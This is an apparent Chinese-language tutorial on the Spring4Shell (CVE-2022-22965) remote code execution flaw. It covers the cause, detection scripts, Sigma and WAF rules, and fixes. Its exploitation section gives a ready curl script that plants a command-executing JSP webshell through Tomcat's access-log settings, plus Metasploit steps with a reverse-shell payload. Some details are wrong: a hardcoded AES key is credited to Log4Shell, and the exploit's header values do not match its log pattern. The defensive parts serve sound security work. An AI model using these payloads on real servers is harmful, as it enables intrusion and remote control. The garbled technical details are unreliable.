# Spring4Shell (CVE-2022-22965) 漏洞完整分析

> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：漏洞库与EXP

## 📋 提纲

1. 漏洞概述
2. Spring框架与漏洞原理
3. 影响范围
4. 漏洞检测方法
5. 漏洞利用复现
6. Spring4Shell vs Log4Shell
7. 护网中的Spring4Shell
8. 修复方案

---

## 1. 漏洞概述

**CVE-2022-22965 (Spring4Shell / SpringShell)**
- CVSS: 9.8
- 类型：JDK 9+ 模块系统的ClassLoader注入导致RCE
- 影响：Spring Framework 5.3.0-5.3.17 / 5.2.0-5.2.19
- 前提：JDK 9+ + Spring MVC + Tomcat + 参数绑定启用
- 公开：2022年3月30日

---

## 2. Spring框架与漏洞原理

### 2.1 Spring MVC 参数绑定

```java
// 正常功能：Spring MVC 的自动参数绑定
@Controller
public class UserController {

    @PostMapping("/register")
    public String register(@ModelAttribute User user) {
        // Spring 自动将 POST 参数绑定到 User 对象
        // POST: name=test&age=20
        // → user.setName("test"); user.setAge(20);
        return "success";
    }
}
```

### 2.2 漏洞触发路径

```
请求参数 → Spring MVC DataBinder → 通过 getter/setter 访问对象属性
                                          ↓
                             如果能访问到 ClassLoader → 修改Tomcat日志配置
                                          ↓
                             写入JSP Webshell → RCE
```

```java
// 攻击链的四个核心class：
// 1. User.getClass() → java.lang.Class
// 2. Class.getClassLoader() → java.lang.ClassLoader (JDK 9+ 是特定 Module)
// 3. ClassLoader → 获取 Tomcat 的 AccessLogValve
// 4. Valve.setPattern/setDirectory/setPrefix/setSuffix → 写入JSP

// 对应的HTTP请求参数：
// class.module.classLoader.resources.context.parent.pipeline.first.pattern
// class.module.classLoader.resources.context.parent.pipeline.first.directory
// class.module.classLoader.resources.context.parent.pipeline.first.prefix
// class.module.classLoader.resources.context.parent.pipeline.first.suffix
// class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat
```

### 2.3 利用链解析

```
class                  → 获取Class对象
  .module              → JDK 9+ Module (java.lang.Module)
    .classLoader       → Module.getClassLoader() 返回ClassLoader
      .resources       → Tomcat WebappClassLoaderBase.resources
        .context       → StandardRoot.getContext() 
          .parent      → ContainerBase.getParent() (Host)
            .pipeline  → StandardHost.getPipeline()
              .first   → 第一个Valve (AccessLogValve)
                .pattern     → 日志格式 → 写入JSP代码
                .directory   → 日志目录 → webapps/ROOT
                .prefix      → 文件名前缀 → shell
                .suffix      → 后缀 → .jsp
                .fileDateFormat → 日期格式 → 空（不加日期）
```

---

## 3. 影响范围

| 框架 | 版本 | JDK | 受影响 |
|------|------|-----|--------|
| Spring Boot | 2.6.0-2.6.3 | ≥9 | ✅ |
| Spring Boot | 2.5.0-2.5.11 | ≥9 | ✅ |
| Spring Framework | 5.3.0-5.3.17 | ≥9 | ✅ |
| Spring Framework | 5.2.0-5.2.19 | ≥9 | ✅ |
| Spring Boot | <2.6.0 | 任意 | ⚠️ 部分 |
| JDK 8 环境 | 任意 | 8 | ❌ 不受影响 |

### 3.1 必要条件

**全部满足才受影响**：
1. ✅ JDK 9+（因为`Class.getModule()`是JDK9引入的）
2. ✅ Spring Framework 受影响版本
3. ✅ 运行在Tomcat上（WAR部署，非嵌入式JAR）
4. ✅ 有`@RequestMapping`/`@PostMapping`端点
5. ✅ 参数绑定未明确限制（`@InitBinder`未设置allowed/disallowed字段）

---

## 4. 漏洞检测

```python
#!/usr/bin/env python3
"""Spring4Shell 检测"""

import requests

def detect_spring4shell(target):
    """检测Spring4Shell漏洞"""
    results = {}

    # 方法1: 发送特定参数观察反应
    # 通过check class.module.classLoader访问是否可达
    test_payloads = [
        # 直接检测JDK9+ Module访问
        {"class.module.classLoader.URLs[0]": "test"},
        # 检测是否触发异常（说明走到了利用链中）
        {"class.module.classLoader.DefaultAssertionStatus": "true"},
    ]

    for payload in test_payloads:
        try:
            resp = requests.post(
                target,
                data=payload,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=False,
                verify=False,
                timeout=10
            )

            # 如果返回400（参数类型错误）= 走到了绑定逻辑 = 可能受影响
            # 如果返回200但无异常 = 走到了getter
            if resp.status_code == 400 and 'module' in resp.text.lower():
                results['suspicious'] = True
                results['response_code'] = 400
                results['method'] = '参数绑定检测'
                break

        except:
            pass

    # 方法2: 尝试写入测试文件（只做无害验证）
    try:
        # 尝试修改 AccessLogValve 配置
        resp = requests.post(
            target,
            data={
                "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".txt",
            },
            verify=False, timeout=10
        )
        if resp.status_code in [200, 400]:
            results['potentially_vulnerable'] = True
    except:
        pass

    # 方法3: 从错误页面推断Spring Boot版本
    try:
        resp = requests.get(target.replace('/api/', '/error'), verify=False)
        if 'Whitelabel Error Page' in resp.text:
            results['spring_boot_detected'] = True
    except:
        pass

    return results
```

### 4.2 护网检测规则

```yaml
# Sigma规则: Spring4Shell 利用检测
title: Spring4Shell Exploitation Attempt
id: spring4shell-001
status: stable
logsource:
  category: webserver
detection:
  url_params:
    cs-uri-query|contains:
      - 'class.module.classLoader'
      - 'class.module.classLoader.resources'
      - 'AccessLogValve'
  post_body:
    cs-method: POST
    cs-body|contains:
      - 'class.module.classLoader'
  condition: url_params or post_body
level: critical
```

```bash
# WAF规则
location ~* / {
    if ($args ~* "class\.module\.classLoader") {
        return 403;
    }
    if ($args ~* "class\.module") {
        return 403;
    }
}
```

---

## 5. 漏洞利用复现

### 5.1 利用环境搭建

```bash
# 1. 创建Spring Boot 2.6.0 + JDK11 漏洞环境
mkdir spring4shell-demo
cd spring4shell-demo

# pom.xml
cat > pom.xml << 'EOF'
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.6.0</version>
</parent>
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
</dependencies>
EOF

# 创建控制器
mkdir -p src/main/java/com/demo
cat > src/main/java/com/demo/GreetingController.java << 'EOF'
@Controller
public class GreetingController {

    @PostMapping("/greeting")
    @ResponseBody
    public String greeting(Greeting greeting) {
        return "Hello, " + greeting.getName();
    }
}

class Greeting {
    private String name;

    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
}
EOF

# 打包为WAR并部署到Tomcat 9 + JDK11
```

### 5.2 利用载荷

```bash
#!/bin/bash
# spring4shell_exploit.sh

TARGET="http://target.com/greeting"

# Step 1: 修改 AccessLogValve 配置
# 让Tomcat将访问日志写入 JSP 文件
curl -X POST "$TARGET" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22shell%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# 参数说明：
# pattern: URL解码后是:
#   <%{2}i if("shell".equals(request.getParameter("pwd"))){
#     java.io.InputStream in = %{1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream();
#     ...
#   } %{suffix}i
# 其中 %{1}i = User-Agent, %{2}i = Referer

# Step 2: 触发日志写入（发送请求让Tomcat记录包含JSP代码的访问日志）
curl "$TARGET" \
  -H "User-Agent: java.lang.ProcessBuilder" \
  -H "Referer: <%"

# Step 3: 访问WebShell
curl "http://target.com/shell.jsp?pwd=shell&cmd=whoami"
```

### 5.3 Metasploit 利用

```bash
msf6 > use exploit/multi/http/spring_cloud_function_spel_injection
# 注意：这是 Spring Cloud Function 的另一个漏洞，Spring4Shell用另外的模块

# Spring4Shell 专用模块（需手动导入）
msf6 > use exploit/multi/http/spring_framework_rce_spring4shell
msf6 > set RHOSTS 192.168.1.100
msf6 > set SRVHOST 10.0.0.1
msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.1
msf6 > set TARGETURI /greeting
msf6 > run
```

---

## 6. Spring4Shell vs Log4Shell

| 对比维度 | Spring4Shell | Log4Shell |
|---------|-------------|-----------|
| CVE | 2022-22965 | 2021-44228 |
| 影响前提 | JDK9+ + WAR部署 | 仅需Log4j2 |
| 利用路径 | HTTP参数 → DataBinder | 任何记录到日志的输入 |
| 默认密钥 | 无密钥 | 硬编码AES密钥 |
| 检测难度 | 中等（需尝试参数绑定） | 低（DNS外带即可） |
| 影响广度 | Spring框架用户 | 所有Java应用 |

---

## 7. 修复方案

### 7.1 紧急修复

```xml
<!-- pom.xml - 升级Spring Framework -->
<properties>
    <spring-framework.version>5.3.18</spring-framework.version>
</properties>
```

```java
// 无法立即升级时的临时缓解
@ControllerAdvice
public class Spring4ShellMitigation {

    @InitBinder
    public void initBinder(WebDataBinder binder) {
        // 禁止绑定以下字段
        binder.setDisallowedFields(
            "class.*",
            "Class.*",
            "*.class.*",
            "*.Class.*"
        );
    }

    // 或者更激进：全局禁用嵌套属性绑定
    @InitBinder
    public void initBinder(WebDataBinder binder, WebRequest request) {
        binder.setAutoGrowNestedPaths(false);
    }
}
```

### 7.2 Nginx缓解

```nginx
if ($args ~* "class\.module") {
    return 403;
}
if ($args ~* "class\.ClassLoader") {
    return 403;
}
if ($args ~* "\.pipeline\.") {
    return 403;
}
```

---

## ✅ Spring4Shell Checklist

- [ ] 全网Spring版本扫描
- [ ] JDK版本确认（≥9且Spring受影响版本=高风险）
- [ ] WAR部署识别（Fat JAR不受影响）
- [ ] 升级Spring Framework 5.3.18+ / 5.2.20+
- [ ] WAF规则部署
- [ ] @InitBinder 全局disallowedFields配置
- [ ] 护网前验证修复

> 📚 延伸阅读：Vuln/002-Log4Shell | Vuln/008-Shiro | CodeAudit/001-PHP代码审计
